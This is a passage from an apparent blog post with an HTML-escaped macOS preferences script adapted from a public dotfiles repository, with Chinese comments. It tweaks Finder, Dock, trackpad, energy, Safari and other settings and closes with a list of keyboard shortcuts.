Done!\\033[0m\u0026#34; # 设置NetBIOSName #sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.smb.server NetBIOSName -string \u0026#34;$compname\u0026#34; \u0026amp;\u0026amp; echo -e \u0026#34;Setting NetBIOSName: $compname ... \\033[32mDone!\\033[0m\u0026#34; echo \u0026#39;# 关闭开机音效\u0026#39; sudo nvram StartupMute=%01 echo \u0026#39;# 复制时的高亮颜色-绿色\u0026#39; defaults write NSGlobalDomain AppleHighlightColor -string \u0026#34;0.764700 0.976500 0.568600\u0026#34; # Set sidebar icon size to medium defaults write NSGlobalDomain NSTableViewDefaultSizeMode -int 1 # Adjust toolbar title rollover delay defaults write NSGlobalDomain NSToolbarTitleViewRolloverDelay -float 0 echo \u0026#39;# 预开展存储视窗\u0026#39; defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true echo \u0026#39;# 加快窗口反应速度 \u0026#39; defaults write NSGlobalDomain NSWindowResizeTime -float 0.001 echo \u0026#39;# 禁用icloud存储\u0026#39; defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false echo \u0026#39;# 打印完毕自动退出打印机软件\u0026#39; defaults write com.apple.print.PrintingPrefs \u0026#34;Quit When Finished\u0026#34; -bool true echo \u0026#39;# 禁止提醒是否打开此软件\u0026#39; defaults write com.apple.LaunchServices LSQuarantine -bool false # Set Help Viewer windows to non-floating mode defaults write com.apple.helpviewer DevMode -bool true # Reveal IP address, hostname, OS version, etc. when clicking the clock # in the login window sudo defaults write /Library/Preferences/com.apple.loginwindow AdminHostInfo HostName # Disable Notification Center and remove the menu bar icon #launchctl unload -w /System/Library/LaunchAgents/com.apple.notificationcenterui.plist 2\u0026gt; /dev/null # Disable automatic capitalization as it’s annoying when typing code defaults write NSGlobalDomain NSAutomaticCapitalizationEnabled -bool false # Disable smart dashes as they’re annoying when typing code defaults write NSGlobalDomain NSAutomaticDashSubstitutionEnabled -bool false # Disable automatic period substitution as it’s annoying when typing code defaults write NSGlobalDomain NSAutomaticPeriodSubstitutionEnabled -bool false # Disable smart quotes as they’re annoying when typing code defaults write NSGlobalDomain NSAutomaticQuoteSubstitutionEnabled -bool false # Disable auto-correct defaults write NSGlobalDomain NSAutomaticSpellingCorrectionEnabled -bool false ############################################################################### # Trackpad, mouse, keyboard, Bluetooth accessories, and input # ############################################################################### # 轻触点击Trackpad: enable tap to click for this user and for the login screen defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad Clicking -bool true defaults -currentHost write NSGlobalDomain com.apple.mouse.tapBehavior -int 1 defaults write NSGlobalDomain com.apple.mouse.tapBehavior -int 1 # 触摸板轻触点击功能 Trackpad: map bottom right corner to right-click  defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad TrackpadCornerSecondaryClick -int 2 defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad TrackpadRightClick -bool true defaults write com.apple.driver.AppleBluetoothMultitouch.mouse MouseButtonMode \u0026#34;TwoButton\u0026#34; defaults -currentHost write NSGlobalDomain com.apple.trackpad.trackpadCornerClickBehavior -int 1 defaults -currentHost write NSGlobalDomain com.apple.trackpad.enableSecondaryClick -bool true echo \u0026#39;# 三指拖拽\u0026#39; defaults -currentHost write NSGlobalDomain com.apple.trackpad.threeFingerDragGesture -bool true defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad TrackpadThreeFingerDrag -bool true echo \u0026#39;# 四指下滑出现expose\u0026#39; defaults write com.apple.AppleMultitouchTrackpad TrackpadThreeFingerVertSwipeGesture -int 0 defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad TrackpadThreeFingerVertSwipeGesture -int 0 defaults write com.apple.dock showAppExposeGestureEnabled -int 1 echo \u0026#39;# 加速触控板/鼠标的速度\u0026#39; # defaults read/write -g com.apple.mouse.scaling 7.5 defaults write NSGlobalDomain com.apple.trackpad.scaling -int 2 defaults write NSGlobalDomain com.apple.mouse.scaling -int 2 echo \u0026#39;# 开启全部视窗组建支持键盘控制\u0026#39; defaults write NSGlobalDomain AppleKeyboardUIMode -int 3 # Increase sound quality for Bluetooth headphones/headsets defaults write com.apple.BluetoothAudioAgent \u0026#34;Apple Bitpool Min (editable)\u0026#34; -int 40 # key rates, normal minimum is 15 (225 ms) echo \u0026#39;# 关闭按住键盘的输入限制\u0026#39; defaults write NSGlobalDomain ApplePressAndHoldEnabled -bool false echo \u0026#39;# \u0026gt;\u0026gt;\u0026gt;需要退出重新登录 ---加快键盘输入速度 Set a blazingly fast keyboard repeat rate\u0026#39; defaults write -g NSGlobalDomain KeyRepeat -int 1 # normal minimum is 2 (30 ms) defaults write NSGlobalDomain InitialKeyRepeat -float 10.0 # Set language and text formats in US defaults write NSGlobalDomain AppleLanguages -array \u0026#34;en\u0026#34; \u0026#34;nl\u0026#34; defaults write NSGlobalDomain AppleLocale -string \u0026#34;en_US@currency=USD\u0026#34; defaults write NSGlobalDomain AppleMeasurementUnits -string \u0026#34;Inches\u0026#34; defaults write NSGlobalDomain AppleMetricUnits -bool false # Show language menu in the top right corner of the boot screen #sudo defaults write /Library/Preferences/com.apple.loginwindow showInputMenu -bool true # Set the timezone; see `sudo systemsetup -listtimezones` for other values sudo systemsetup -settimezone \u0026#34;Asia/Shanghai\u0026#34; \u0026gt; /dev/null echo \u0026#39; ############################################################################### # Energy saviing # ############################################################################### \u0026#39; # Enable lid wakeup sudo pmset -a lidwake 1 # Restart automatically on power loss sudo pmset -a autorestart 1 # Restart automatically if the computer freezes sudo systemsetup -setrestartfreeze on # Sleep the display after 15 minutes sudo pmset -a displaysleep 15 # Disable machine sleep while charging sudo pmset -c sleep 0 # Set machine sleep to 5 minutes on battery sudo pmset -b sleep 30 echo \u0026#39;# 设置电池进入睡眠间隔为24小时\u0026#39; sudo pmset -a standbydelay 86400 echo \u0026#39;# 关闭电源进入睡眠模式 \u0026#39; sudo systemsetup -setcomputersleep Off \u0026gt; /dev/null # Hibernation mode # 0: Disable hibernation (speeds up entering sleep mode) # 3: Copy RAM to disk so the system state can still be restored in case of a # power failure. sudo pmset -a hibernatemode 0 # Remove the sleep image file to save disk space sudo rm /private/var/vm/sleepimage # Create a zero-byte file instead… sudo touch /private/var/vm/sleepimage # …and make sure it can’t be rewritten sudo chflags uchg /private/var/vm/sleepimage echo \u0026#39; ############################################################################### # Screen # ############################################################################### \u0026#39; # Require password immediately after sleep or screen saver begins defaults write com.apple.screensaver askForPassword -int 1 defaults write com.apple.screensaver askForPasswordDelay -int 0 # Save screenshots to the desktop defaults write com.apple.screencapture location -string \u0026#34;${HOME}/Desktop\u0026#34; # 截屏格式为png 。Save screenshots in PNG format (other options: BMP, GIF, JPG, PDF, TIFF) defaults write com.apple.screencapture type -string \u0026#34;png\u0026#34; echo \u0026#39;# 关闭截屏阴影 Disable shadow in screenshots\u0026#39; defaults write com.apple.screencapture disable-shadow -bool true # Enable subpixel font rendering on non-Apple LCDs # Reference: https://github.com/kevinSuttle/macOS-Defaults/issues/17#issuecomment-266633501 defaults write NSGlobalDomain AppleFontSmoothing -int 1 # Enable HiDPI display modes (requires restart) sudo defaults write /Library/Preferences/com.apple.windowserver DisplayResolutionEnabled -bool true echo \u0026#39; ############################################################################### # Finder # ############################################################################### \u0026#39; # Finder: disable window animations and Get Info animations defaults write com.apple.finder DisableAllAnimations -bool true defaults write com.apple.dock workspaces-swoosh-animation-off -bool YES echo \u0026#39;# 预设Finder起始位置为Download\u0026#39; defaults write com.apple.finder NewWindowTarget -string \u0026#34;PfLo\u0026#34; defaults write com.apple.finder NewWindowTargetPath -string \u0026#34;file://${HOME}/Downloads/\u0026#34; # Show icons for hard drives, servers, and removable media on the desktop echo \u0026#39;# 桌面显示外部硬盘\u0026#39; defaults write com.apple.finder ShowExternalHardDrivesOnDesktop -bool true defaults write com.apple.finder ShowHardDrivesOnDesktop -bool false # 桌面不显示硬盘 defaults write com.apple.finder ShowMountedServersOnDesktop -bool true defaults write com.apple.finder ShowRemovableMediaOnDesktop -bool true echo \u0026#39;# 显示系统隐藏文件\u0026#39; # Finder: show hidden files by default defaults write com.apple.finder AppleShowAllFiles -bool true echo \u0026#39;# 显示文件扩展名、状态栏、文件路径\u0026#39; # 显示文件扩展名 defaults write NSGlobalDomain AppleShowAllExtensions -bool true # 显示状态栏 defaults write com.apple.finder ShowStatusBar -bool true # 显示文件路径条 defaults write com.apple.finder ShowPathbar -bool true # Finder窗口标题显示完整路径 Display full POSIX path as Finder window title defaults write com.apple.finder _FXShowPosixPathInTitle -bool true echo \u0026#39;# 允许匡选Finde Quick Look文字\u0026#39; defaults write com.apple.finder QLEnableTextSelection -bool true echo \u0026#39;# 排序时目录始终在顶部\u0026#39; defaults write com.apple.finder _FXSortFoldersFirst -bool true echo \u0026#39;# 搜索时在当前文件夹内搜索\u0026#39; defaults write com.apple.finder FXDefaultSearchScope -string \u0026#34;SCcf\u0026#34; echo \u0026#39;# 更改文件后缀时不提醒\u0026#39; defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false # Enable spring loading for directories defaults write NSGlobalDomain com.apple.springing.enabled -bool true # Remove the spring loading delay for directories defaults write NSGlobalDomain com.apple.springing.delay -float 0 echo \u0026#39;# 在网络和硬盘上不创建.DS_Store文件 ，重启生效\u0026#39; sudo find / -name \u0026#34;.DS_Store\u0026#34; -depth -exec rm {} \\; defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true # 恢复.DS_store生成 #defaults delete com.apple.desktopservices DSDontWriteNetworkStores # 删除已经存在的.DS_Store文件 sudo find / -name \u0026#34;.DS_Store\u0026#34; -depth -exec rm -f {} \\; echo \u0026#39;# 关闭磁盘镜像验证\u0026#39; defaults write com.apple.frameworks.diskimages skip-verify -bool true defaults write com.apple.frameworks.diskimages skip-verify-locked -bool true defaults write com.apple.frameworks.diskimages skip-verify-remote -bool true echo \u0026#39;# 有新磁盘被挂在时自动打开\u0026#39; # Automatically open a new Finder window when a volume is mounted defaults write com.apple.frameworks.diskimages auto-open-ro-root -bool true defaults write com.apple.frameworks.diskimages auto-open-rw-root -bool true defaults write com.apple.finder OpenWindowForNewRemovableDisk -bool true # Show item info near icons on the desktop and in other icon views /usr/libexec/PlistBuddy -c \u0026#34;Set :DesktopViewSettings:IconViewSettings:showItemInfo true\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :FK_StandardViewSettings:IconViewSettings:showItemInfo true\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :StandardViewSettings:IconViewSettings:showItemInfo true\u0026#34; ~/Library/Preferences/com.apple.finder.plist # Show item info to the right of the icons on the desktop /usr/libexec/PlistBuddy -c \u0026#34;Set DesktopViewSettings:IconViewSettings:labelOnBottom false\u0026#34; ~/Library/Preferences/com.apple.finder.plist # Enable snap-to-grid for icons on the desktop and in other icon views /usr/libexec/PlistBuddy -c \u0026#34;Set :DesktopViewSettings:IconViewSettings:arrangeBy grid\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :FK_StandardViewSettings:IconViewSettings:arrangeBy grid\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :StandardViewSettings:IconViewSettings:arrangeBy grid\u0026#34; ~/Library/Preferences/com.apple.finder.plist # Increase grid spacing for icons on the desktop and in other icon views /usr/libexec/PlistBuddy -c \u0026#34;Set :DesktopViewSettings:IconViewSettings:gridSpacing 100\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :FK_StandardViewSettings:IconViewSettings:gridSpacing 100\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :StandardViewSettings:IconViewSettings:gridSpacing 100\u0026#34; ~/Library/Preferences/com.apple.finder.plist # Increase the size of icons on the desktop and in other icon views /usr/libexec/PlistBuddy -c \u0026#34;Set :DesktopViewSettings:IconViewSettings:iconSize 80\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :FK_StandardViewSettings:IconViewSettings:iconSize 80\u0026#34; ~/Library/Preferences/com.apple.finder.plist /usr/libexec/PlistBuddy -c \u0026#34;Set :StandardViewSettings:IconViewSettings:iconSize 80\u0026#34; ~/Library/Preferences/com.apple.finder.plist # Use list view in all Finder windows by default # 使用column view作文Finder默认显示选项 Four-letter codes for the other view modes: `icnv`, `clmv`, `glyv` defaults write com.apple.finder FXPreferredViewStyle -string \u0026#34;clmv\u0026#34; echo \u0026#39;# 清空垃圾桶不提醒\u0026#39; defaults write com.apple.finder WarnOnEmptyTrash -bool false echo \u0026#39; Show the ~/Library folder\u0026#39; chflags nohidden ~/Library \u0026amp;\u0026amp; xattr -d com.apple.FinderInfo ~/Library # Show the /Volumes folder # sudo chflags nohidden /Volumes echo \u0026#39; ############################################################################### # Dock, Dashboard, and hot corners # ############################################################################### \u0026#39; # Enable highlight hover effect for the grid view of a stack (Dock) defaults write com.apple.dock mouse-over-hilite-stack -bool true echo \u0026#39;# 使用单选列和Dock使用黑色\u0026#39; defaults write NSGlobalDomain AppleInterfaceStyle Dark echo \u0026#39;# Set the icon size of Dock items to 36 pixels\u0026#39; defaults write com.apple.dock tilesize -int 36 echo \u0026#39;# 使用缩放改变窗口大小 Change minimize/maximize window effect\u0026#39; defaults write com.apple.dock mineffect -string \u0026#34;scale\u0026#34; echo \u0026#39;# 程序缩小至图标 Minimize windows into their application’s icon\u0026#39; defaults write com.apple.dock minimize-to-application -bool true # Enable spring loading for all Dock items defaults write com.apple.dock enable-spring-load-actions-on-all-items -bool true echo \u0026#39;# 显示Docker中打开程序的小灯提示 Show indicator lights for open applications in the Dock\u0026#39; defaults write com.apple.dock show-process-indicators -bool true echo \u0026#39;# 关闭打开程序的动画效果 Don’t animate opening applications from the Dock\u0026#39; defaults write com.apple.dock launchanim -bool false echo \u0026#39;# 加快Mission Control的动画速度 Speed up Mission Control animations\u0026#39; defaults write com.apple.dock expose-animation-duration -float 0.1 echo \u0026#39;# 关闭Mission Control群组化显示\u0026#39; defaults write com.apple.dock expose-group-by-app -bool false echo \u0026#39;# Disable Dashboard\u0026#39; defaults write com.apple.dashboard mcx-disabled -bool true echo \u0026#39;# 在多重桌面中移除Don’t show Dashboard as a Space\u0026#39; defaults write com.apple.dock dashboard-in-overlay -bool true # Don’t automatically rearrange Spaces based on most recent use defaults write com.apple.dock mru-spaces -bool false echo \u0026#39;# 关闭隐藏dock的延迟 Remove the auto-hiding Dock delay\u0026#39; defaults write com.apple.dock autohide-delay -float 0 echo \u0026#39;# 关闭隐藏dock的动画效果 Remove the animation when hiding/showing the Dock\u0026#39; defaults write com.apple.dock autohide-time-modifier -float 0 echo \u0026#39;# 自动隐藏dock栏 Automatically hide and show the Dock\u0026#39; defaults write com.apple.dock autohide -bool true echo \u0026#39;# 将隐藏的程序Dock图表半透明化显示Make Dock icons of hidden applications translucent\u0026#39; defaults write com.apple.dock showhidden -bool true echo \u0026#39;# Don’t show recent applications in Dock\u0026#39; defaults write com.apple.dock show-recents -bool true # Add iOS \u0026amp; Watch Simulator to Launchpad #sudo ln -sf \u0026#34;/Applications/Xcode.app/Contents/Developer/Applications/Simulator.app\u0026#34; \u0026#34;/Applications/Simulator.app\u0026#34; #sudo ln -sf \u0026#34;/Applications/Xcode.app/Contents/Developer/Applications/Simulator (Watch).app\u0026#34; \u0026#34;/Applications/Simulator (Watch).app\u0026#34; # Hot corners # Possible values: # 0: no-op # 2: Mission Control # 3: Show application windows # 4: Desktop # 5: Start screen saver # 6: Disable screen saver # 7: Dashboard # 10: Put display to sleep # 11: Launchpad # 12: Notification Center # 13: Lock Screen # Top left screen corner → MMission Control defaults write com.apple.dock wvous-tl-corner -int 2 defaults write com.apple.dock wvous-tl-modifier -int 0 # Top right screen corner → Desktop defaults write com.apple.dock wvous-tr-corner -int 4 defaults write com.apple.dock wvous-tr-modifier -int 0 # Bottom left screen corner → Lock Screen defaults write com.apple.dock wvous-bl-corner -int 13 defaults write com.apple.dock wvous-bl-modifier -int 0 ############################################################################### # Safari \u0026amp; WebKit # ############################################################################### # Privacy: don’t send search queries to Apple defaults write com.apple.Safari UniversalSearchEnabled -bool false defaults write com.apple.Safari SuppressSearchSuggestions -bool true # Press Tab to highlight each item on a web page defaults write com.apple.Safari WebKitTabToLinksPreferenceKey -bool true defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2TabsToLinks -bool true # Show the full URL in the address bar (note: this still hides the scheme) defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true # Set Safari’s home page to `about:blank` for faster loading defaults write com.apple.Safari HomePage -string \u0026#34;about:blank\u0026#34; # Prevent Safari from opening ‘safe’ files automatically after downloading defaults write com.apple.Safari AutoOpenSafeDownloads -bool false # Allow hitting the Backspace key to go to the previous page in history defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2BackspaceKeyNavigationEnabled -bool true # Hide Safari’s bookmarks bar by default defaults write com.apple.Safari ShowFavoritesBar -bool false # Hide Safari’s sidebar in Top Sites defaults write com.apple.Safari ShowSidebarInTopSites -bool false # Disable Safari’s thumbnail cache for History and Top Sites defaults write com.apple.Safari DebugSnapshotsUpdatePolicy -int 2 # Enable Safari’s debug menu defaults write com.apple.Safari IncludeInternalDebugMenu -bool true # Make Safari’s search banners default to Contains instead of Starts With defaults write com.apple.Safari FindOnPageMatchesWordStartsOnly -bool false # Remove useless icons from Safari’s bookmarks bar defaults write com.apple.Safari ProxiesInBookmarksBar \u0026#34;()\u0026#34; # Enable the Develop menu and the Web Inspector in Safari defaults write com.apple.Safari IncludeDevelopMenu -bool true defaults write com.apple.Safari WebKitDeveloperExtrasEnabledPreferenceKey -bool true defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2DeveloperExtrasEnabled -bool true # Add a context menu item for showing the Web Inspector in web views defaults write NSGlobalDomain WebKitDeveloperExtras -bool true # Enable continuous spellchecking defaults write com.apple.Safari WebContinuousSpellCheckingEnabled -bool true # Disable auto-correct defaults write com.apple.Safari WebAutomaticSpellingCorrectionEnabled -bool false # Disable AutoFill defaults write com.apple.Safari AutoFillFromAddressBook -bool false defaults write com.apple.Safari AutoFillPasswords -bool false defaults write com.apple.Safari AutoFillCreditCardData -bool false defaults write com.apple.Safari AutoFillMiscellaneousForms -bool false # Warn about fraudulent websites defaults write com.apple.Safari WarnAboutFraudulentWebsites -bool true # Disable plug-ins defaults write com.apple.Safari WebKitPluginsEnabled -bool false defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2PluginsEnabled -bool false # Disable Java defaults write com.apple.Safari WebKitJavaEnabled -bool false defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2JavaEnabled -bool false defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2JavaEnabledForLocalFiles -bool false # Block pop-up windows defaults write com.apple.Safari WebKitJavaScriptCanOpenWindowsAutomatically -bool false defaults write com.apple.Safari com.apple.Safari.ContentPageGroupIdentifier.WebKit2JavaScriptCanOpenWindowsAutomatically -bool false # Enable “Do Not Track” defaults write com.apple.Safari SendDoNotTrackHTTPHeader -bool true # Update extensions automatically defaults write com.apple.Safari InstallExtensionUpdatesAutomatically -bool true ############################################################################### # Mail # ############################################################################### # Disable send and reply animations in Mail.app defaults write com.apple.mail DisableReplyAnimations -bool true defaults write com.apple.mail DisableSendAnimations -bool true # Copy email addresses as `foo@example.com` instead of `Foo Bar \u0026lt;foo@example.com\u0026gt;` in Mail.app defaults write com.apple.mail AddressesIncludeNameOnPasteboard -bool false # Add the keyboard shortcut ⌘ + Enter to send an email in Mail.app defaults write com.apple.mail NSUserKeyEquivalents -dict-add \u0026#34;Send\u0026#34; \u0026#34;@\\U21a9\u0026#34; # Display emails in threaded mode, sorted by date (oldest at the top) defaults write com.apple.mail DraftsViewerAttributes -dict-add \u0026#34;DisplayInThreadedMode\u0026#34; -string \u0026#34;yes\u0026#34; defaults write com.apple.mail DraftsViewerAttributes -dict-add \u0026#34;SortedDescending\u0026#34; -string \u0026#34;yes\u0026#34; defaults write com.apple.mail DraftsViewerAttributes -dict-add \u0026#34;SortOrder\u0026#34; -string \u0026#34;received-date\u0026#34; # Disable inline attachments (just show the icons) defaults write com.apple.mail DisableInlineAttachmentViewing -bool true # Disable automatic spell checking defaults write com.apple.mail SpellCheckingBehavior -string \u0026#34;NoSpellCheckingEnabled\u0026#34; ############################################################################### # Spotlight # ############################################################################### # Hide Spotlight tray-icon (and subsequent helper) #sudo chmod 600 /System/Library/CoreServices/Search.bundle/Contents/MacOS/Search # Disable Spotlight indexing for any volume that gets mounted and has not yet # been indexed before. # Use `sudo mdutil -i off \u0026#34;/Volumes/foo\u0026#34;` to stop indexing any volume. sudo defaults write /.Spotlight-V100/VolumeConfiguration Exclusions -array \u0026#34;/Volumes\u0026#34; # 关闭spotlight索引的进程mdworker # sudo mdutil -a -i off # 关闭系统崩溃报错 defaults write com.apple.CrashReporter DialogType none # 开启报错 # defaults write com.apple.CrashReporter DialogType crashreport  ############################################################################### # Terminal \u0026amp; iTerm 2 # ############################################################################### # Only use UTF-8 in Terminal.app defaults write com.apple.terminal StringEncodings -array 4 # Use a modified version of the Solarized Dark theme by default in Terminal.app osascript \u0026lt;\u0026lt;EOD tell application \u0026#34;Terminal\u0026#34; local allOpenedWindows local initialOpenedWindows local windowID set themeName to \u0026#34;Solarized Dark xterm-256color\u0026#34; (* Store the IDs of all the open terminal windows. *) set initialOpenedWindows to id of every window (* Open the custom theme so that it gets added to the list of available terminal themes (note: this will open two additional terminal windows). *) do shell script \u0026#34;open \u0026#39;$HOME/init/\u0026#34; \u0026amp; themeName \u0026amp; \u0026#34;.terminal\u0026#39;\u0026#34; (* Wait a little bit to ensure that the custom theme is added. *) delay 1 (* Set the custom theme as the default terminal theme. *) set default settings to settings set themeName (* Get the IDs of all the currently opened terminal windows. *) set allOpenedWindows to id of every window repeat with windowID in allOpenedWindows (* Close the additional windows that were opened in order to add the custom theme to the list of terminal themes. *) if initialOpenedWindows does not contain windowID then close (every window whose id is windowID) (* Change the theme for the initial opened terminal windows to remove the need to close them in order for the custom theme to be applied. *) else set current settings of tabs of (every window whose id is windowID) to settings set themeName end if end repeat end tell EOD # Enable Secure Keyboard Entry in Terminal.app # See: https://security.stackexchange.com/a/47786/8918 defaults write com.apple.terminal SecureKeyboardEntry -bool true # Disable the annoying line marks defaults write com.apple.Terminal ShowLineMarks -int 0 # Don’t display the annoying prompt when quitting iTerm defaults write com.googlecode.iterm2 PromptOnQuit -bool false ############################################################################### # Time Machine # ############################################################################### # Prevent Time Machine from prompting to use new hard drives as backup volume defaults write com.apple.TimeMachine DoNotOfferNewDisksForBackup -bool true # 关闭Time Machine .Disable local Time Machine backups #hash tmutil \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; sudo tmutil disablelocal ############################################################################### # Activity Monitor # ############################################################################### # Show the main window when launching Activity Monitor defaults write com.apple.ActivityMonitor OpenMainWindow -bool true # Visualize CPU usage in the Activity Monitor Dock icon defaults write com.apple.ActivityMonitor IconType -int 5 # Show all processes in Activity Monitor defaults write com.apple.ActivityMonitor ShowCategory -int 0 # Sort Activity Monitor results by CPU usage defaults write com.apple.ActivityMonitor SortColumn -string \u0026#34;CPUUsage\u0026#34; defaults write com.apple.ActivityMonitor SortDirection -int 0 ############################################################################### # TextEdit, and Disk Utility # ############################################################################### # Enable Dashboard dev mode (allows keeping widgets on the desktop) defaults write com.apple.dashboard devmode -bool true # Use plain text mode for new TextEdit documents defaults write com.apple.TextEdit RichText -int 0 # Open and save files as UTF-8 in TextEdit defaults write com.apple.TextEdit PlainTextEncoding -int 4 defaults write com.apple.TextEdit PlainTextEncodingForWrite -int 4 # Enable the debug menu in Disk Utility defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true defaults write com.apple.DiskUtility advanced-image-options -bool true # Auto-play videos when opened with QuickTime Player defaults write com.apple.QuickTimePlayerX MGPlayMovieOnOpen -bool true ############################################################################### # Mac App Store # ############################################################################### # Enable the WebKit Developer Tools in the Mac App Store defaults write com.apple.appstore WebKitDeveloperExtras -bool true # Enable Debug Menu in the Mac App Store defaults write com.apple.appstore ShowDebugMenu -bool true # Enable the automatic update check defaults write com.apple.SoftwareUpdate AutomaticCheckEnabled -bool true # Check for software updates daily, not just once per week defaults write com.apple.SoftwareUpdate ScheduleFrequency -int 1 # Download newly available updates in background defaults write com.apple.SoftwareUpdate AutomaticDownload -int 1 # Install System data files \u0026amp; security updates defaults write com.apple.SoftwareUpdate CriticalUpdateInstall -int 1 # Automatically download apps purchased on other Macs defaults write com.apple.SoftwareUpdate ConfigDataInstall -int 1 # Turn on app auto-update defaults write com.apple.commerce AutoUpdate -bool true # Allow the App Store to reboot machine on macOS updates defaults write com.apple.commerce AutoUpdateRestartRequired -bool true ############################################################################### # Photos # ############################################################################### # Prevent Photos from opening automatically when devices are plugged in defaults -currentHost write com.apple.ImageCapture disableHotPlug -bool true ############################################################################### # Messages # ############################################################################### # Disable automatic emoji substitution (i.e. use plain text smileys) defaults write com.apple.messageshelper.MessageController SOInputLineSettings -dict-add \u0026#34;automaticEmojiSubstitutionEnablediMessage\u0026#34; -bool false # Disable smart quotes as it’s annoying for messages that contain code defaults write com.apple.messageshelper.MessageController SOInputLineSettings -dict-add \u0026#34;automaticQuoteSubstitutionEnabled\u0026#34; -bool false # Disable continuous spell checking defaults write com.apple.messageshelper.MessageController SOInputLineSettings -dict-add \u0026#34;continuousSpellCheckingEnabled\u0026#34; -bool false ############################################################################### # Google Chrome \u0026amp; Google Chrome Canary # ############################################################################### # Disable the all too sensitive backswipe on trackpads defaults write com.google.Chrome AppleEnableSwipeNavigateWithScrolls -bool false defaults write com.google.Chrome.canary AppleEnableSwipeNavigateWithScrolls -bool false # Disable the all too sensitive backswipe on Magic Mouse defaults write com.google.Chrome AppleEnableMouseSwipeNavigateWithScrolls -bool false defaults write com.google.Chrome.canary AppleEnableMouseSwipeNavigateWithScrolls -bool false # Use the system-native print preview dialog defaults write com.google.Chrome DisablePrintPreview -bool true defaults write com.google.Chrome.canary DisablePrintPreview -bool true # Expand the print dialog by default defaults write com.google.Chrome PMPrintingExpandedStateForPrint2 -bool true defaults write com.google.Chrome.canary PMPrintingExpandedStateForPrint2 -bool true ############################################################################### # Mac App Store # ############################################################################### # Enable the WebKit Developer Tools in the Mac App Store defaults write com.apple.appstore WebKitDeveloperExtras -bool true # Enable Debug Menu in the Mac App Store defaults write com.apple.appstore ShowDebugMenu -bool true # Enable the automatic update check defaults write com.apple.SoftwareUpdate AutomaticCheckEnabled -bool true # Check for software updates daily, not just once per week defaults write com.apple.SoftwareUpdate ScheduleFrequency -int 1 # Download newly available updates in background defaults write com.apple.SoftwareUpdate AutomaticDownload -int 1 # Install System data files \u0026amp; security updates defaults write com.apple.SoftwareUpdate CriticalUpdateInstall -int 1 # Automatically download apps purchased on other Macs defaults write com.apple.SoftwareUpdate ConfigDataInstall -int 1 # Turn on app auto-update defaults write com.apple.commerce AutoUpdate -bool true # Allow the App Store to reboot machine on macOS updates defaults write com.apple.commerce AutoUpdateRestartRequired -bool true ############################################################################### # Address Book, Dashboard, iCal, TextEdit, and Disk Utility # ############################################################################### # Enable the debug menu in Address Book defaults write com.apple.addressbook ABShowDebugMenu -bool true # Enable Dashboard dev mode (allows keeping widgets on the desktop) defaults write com.apple.dashboard devmode -bool true # Enable the debug menu in iCal (pre-10.8) defaults write com.apple.iCal IncludeDebugMenu -bool true # Use plain text mode for new TextEdit documents defaults write com.apple.TextEdit RichText -int 0 # Open and save files as UTF-8 in TextEdit defaults write com.apple.TextEdit PlainTextEncoding -int 4 defaults write com.apple.TextEdit PlainTextEncodingForWrite -int 4 # Enable the debug menu in Disk Utility defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true defaults write com.apple.DiskUtility advanced-image-options -bool true # Auto-play videos when opened with QuickTime Player defaults write com.apple.QuickTimePlayerX MGPlayMovieOnOpen -bool true ############################################################################### # Time Machine # ############################################################################### # Prevent Time Machine from prompting to use new hard drives as backup volume defaults write com.apple.TimeMachine DoNotOfferNewDisksForBackup -bool true # Disable local Time Machine backups hash tmutil \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; sudo tmutil disablelocal ############################################################################### # Activity Monitor # ############################################################################### # Show the main window when launching Activity Monitor defaults write com.apple.ActivityMonitor OpenMainWindow -bool true # Visualize CPU usage in the Activity Monitor Dock icon defaults write com.apple.ActivityMonitor IconType -int 5 # Show all processes in Activity Monitor defaults write com.apple.ActivityMonitor ShowCategory -int 0 # Sort Activity Monitor results by CPU usage defaults write com.apple.ActivityMonitor SortColumn -string \u0026#34;CPUUsage\u0026#34; defaults write com.apple.ActivityMonitor SortDirection -int 0 # Don’t display the annoying prompt when quitting iTerm defaults write com.googlecode.iterm2 PromptOnQuit -bool false # 参考 https://github.com/mathiasbynens/dotfiles/blob/main/.macos   Finder操作 窗口管理技巧  Command + W 关闭当前窗口 Command + Q 退出程序 Command + M 最小化当前窗口 _Command + H _ 隐藏当前程序所有窗口 _Control Command + F 窗口全屏 / 退出全屏  高级技巧\n Command + Option + W 关闭当前程序的所有窗口 Command + Option + M 最小化当前程序的所有窗口\n进阶技巧 Command + Tab 若干次，然后只松开 Tab 再按 Q 在切换程序界面快速关闭程序\n这是一个快捷键组合，操作过程中需要保持 Command 一直处于按住状态 Command + Option + 